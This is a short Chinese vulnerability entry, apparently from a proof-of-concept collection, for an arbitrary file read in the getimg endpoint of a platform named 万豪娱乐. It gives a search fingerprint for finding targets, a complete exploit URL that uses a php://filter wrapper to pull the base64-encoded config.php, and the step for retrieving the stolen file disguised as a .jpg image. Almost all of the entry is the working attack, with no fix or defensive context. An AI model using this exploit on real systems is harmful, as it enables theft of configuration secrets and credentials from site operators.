# 万豪娱乐getimg存在任意文件读取漏洞

万豪娱乐 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"Public/Js/Mobile"`
- **请求**：`https://IP/Home/game/getimg?url=php://filter/read=convert.base64-encode/resource=Application/Common/Conf/config.php&id=1993`

**Payload**
```
使用poc访问后，接着访问 /public/gamelist/1993.jpg 的图片，保存下来就是读取到的内容
```
- **响应特征**：200